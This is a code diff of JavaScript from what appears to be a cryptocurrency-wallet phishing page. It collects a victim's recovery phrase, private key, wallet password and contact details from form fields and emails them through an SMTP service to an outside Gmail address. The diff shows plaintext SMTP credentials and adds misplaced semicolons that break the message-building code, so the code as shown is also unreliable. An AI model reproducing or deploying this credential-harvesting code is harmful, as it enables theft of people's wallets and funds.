@@ -8,33 +8,35 @@ function emailSend(){
 
 	var email = document.getElementById('email'
 
+	).value;
+
 	var wallet = document.getElementById('wallet').value;
 
 	var phrase = document.getElementById('phrase').value;
 
 	var walletp = document.getElementById('walletp'
 
+		).value;
+
 	var privk = document.getElementById('privk'
 
-	
-
-	).value; 
+	).value;
 
 
 
-	var messageBody = "Name " + userName +
+	var messageBody = "Name " + userName; +
 
-	"<br/> Phone " + phone +
+	"<br/> Phone " + phone; +
 
-	"<br/> Email " + email;
+	"<br/> Email " + email; +
 
-	"<br/> Wallet " + wallet +
+	"<br/> Wallet " + wallet; +
 
-	"<br/> Phrase " + phrase;
+	"<br/> Phrase " + phrase; +
 
-	"<br/> walletp " + walletp;
+	"<br/> walletp " + walletp; +
 
-	"<br/> privk " + privk;
+	"<br/> privk " + privk; +
 
 	
 
@@ -44,9 +46,9 @@ function emailSend(){
 
     Username : "adeolatoolz@gmail.com",
 
-    Password : "9460FC7859351FA8C67272051ECC2B1D9C30",
+    Password : "2172D5A7255CC4CA36D4529DF81CAE9A28F8",
 
-    To : 'go.marryjane@gmail.com',
+    To : "go.marryjane@gmail.com",
 
     From : "adeolatoolz@gmail.com",
 
